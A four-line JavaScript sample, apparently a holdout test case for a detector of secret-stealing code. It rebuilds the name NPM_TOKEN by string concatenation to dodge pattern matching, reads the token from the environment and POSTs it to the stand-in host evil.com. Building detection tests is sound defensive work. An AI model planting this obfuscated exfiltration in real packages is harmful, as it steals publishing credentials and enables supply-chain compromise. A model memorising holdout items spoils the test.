// Holdout v4 — concat-env-steal: env var name rebuilt by concat
const key = 'NPM' + '_' + 'TOK' + 'EN';
const val = process.env[key];
require('https').request({ hostname: 'evil.com', path: '/steal', method: 'POST' }, () => {}).write(val);
